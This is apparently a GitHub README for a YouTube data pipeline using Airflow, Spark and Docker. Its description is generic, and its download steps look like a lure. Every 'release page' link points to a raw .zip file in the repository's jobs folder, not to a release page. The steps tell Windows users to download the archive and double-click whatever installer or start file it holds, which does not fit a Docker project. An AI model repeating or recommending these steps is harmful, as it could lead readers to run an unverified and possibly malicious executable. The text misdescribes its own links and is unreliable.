# 🚀 youtube-etl-airflow-spark - Run a YouTube Data Pipeline

[![Download the app](https://img.shields.io/badge/Download%20Release-4B9CD3?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)

## 📦 What this app does

This project runs a YouTube data pipeline on your computer. It pulls data from the YouTube API, moves it through Airflow, processes it with Spark, and stores it in clear stages.

It uses a Bronze / Silver / Gold setup:

- **Bronze** keeps raw data
- **Silver** cleans and shapes the data
- **Gold** prepares data for use and review

You can use it to see how a real data engineering workflow works in a simple, local setup.

## 🖥️ What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- A modern web browser
- Enough free disk space for Docker images and data files
- A stable internet connection
- Docker Desktop installed
- At least 8 GB of RAM
- Python only if you plan to inspect the code

If you do not already have Docker Desktop, install it first. This app runs inside Docker containers, so Docker is required.

## 📥 Download and install

1. Go to the release page here: [Download the latest release](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)
2. On the release page, open the newest release
3. Download the file provided in that release
4. Save the file to a folder you can find again, such as `Downloads` or `Desktop`
5. If the release includes a package or archive, extract it
6. Open Docker Desktop and make sure it is running
7. Follow the files in the release folder to start the app

If the release contains a Windows installer, run it with a double click. If it contains a `.zip` file, extract it first, then follow the included startup file.

## 🛠️ First-time setup

After you download the release:

1. Open the folder where you saved the files
2. Look for a file named like `start`, `run`, or `docker-compose`
3. Open Docker Desktop
4. Wait until Docker says it is ready
5. Run the setup file or start file from the release package
6. Wait for the containers to finish starting
7. Open your browser and use the local address shown in the release files

If the app asks for a YouTube API key, add the key in the setup file or the config file included in the download. The pipeline uses that key to fetch YouTube data.

## 🚦 How it works

Once the app is running, it moves data through these steps:

1. **Extract**  
   The app reads data from YouTube.

2. **Load to Bronze**  
   It saves raw data in the first layer.

3. **Clean and transform**  
   Spark processes the data and removes unwanted fields.

4. **Move to Silver**  
   Cleaned data is stored in a better format.

5. **Create Gold outputs**  
   Final tables are prepared for viewing and analysis.

6. **Run on a schedule**  
   Airflow controls when each task runs.

This setup shows how one task depends on the next.

## 🧭 Folder layout

The release package may include folders like these:

- `dags` — Airflow task files
- `scripts` — helper files used by the pipeline
- `data` — saved pipeline output
- `configs` — app settings
- `docker` — files used by Docker
- `logs` — run history and task logs

If you want to inspect the project later, these folders help you find each part of the pipeline.

## 🔧 Common tasks

### Start the app

- Open Docker Desktop
- Open the release files
- Run the start file or compose file
- Wait for all services to start

### Stop the app

- Close the browser tab
- Stop the containers from Docker Desktop
- Or use the stop file if one is included

### Restart the app

- Stop the containers
- Start them again from the release files

### View logs

- Open Docker Desktop
- Select the running containers
- Open the logs tab
- Check task progress and errors there

## 🌐 What you may see in the browser

After the app starts, you may see:

- An Airflow dashboard
- Pipeline task status
- Run history
- Scheduled jobs
- Success and failed tasks
- Links to logs

These screens help you check whether the pipeline is running as expected.

## 🔐 API key setup

This project uses the YouTube API. To fetch data, you may need a valid API key.

Typical setup steps:

1. Find the config file in the release package
2. Open it with Notepad
3. Paste your API key in the right field
4. Save the file
5. Restart the app

If the release includes an example config file, copy it first and edit the copy.

## 🧪 Data flow stages

The pipeline follows a medallion-style layout:

- **Bronze**
  - Stores raw input
  - Keeps the original data shape

- **Silver**
  - Removes bad records
  - Standardizes fields
  - Makes the data easier to use

- **Gold**
  - Builds final outputs
  - Supports reporting and review

This structure keeps each stage separate and easier to manage.

## 🧩 Tech used

- Apache Airflow
- PySpark
- Docker
- YouTube API
- Python
- Apache Spark

These tools work together to automate data collection and processing.

## ❓ Help with common problems

### Docker will not start

- Restart your PC
- Open Docker Desktop again
- Make sure virtualization is enabled in BIOS if Docker asks for it
- Close other heavy apps to free memory

### The browser page does not open

- Wait a little longer for startup to finish
- Check Docker Desktop for running containers
- Make sure you used the right local address

### The pipeline fails right away

- Check the logs in Docker Desktop
- Confirm the API key is correct
- Make sure the release files were not moved after setup

### The app runs slowly

- Close other apps
- Give Docker more memory
- Restart the pipeline

## 📌 Release download

Use this page to download the files for Windows: [https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)

Open the latest release, download the package, extract it if needed, then run the provided start file or installer

## 🗂️ Repo topics

airflow-dags, airflow-docker, apache, apache-airflow, apache-spark, docker, docker-image, etl, etl-pipeline, medallion-architecture, pyspark, python, spark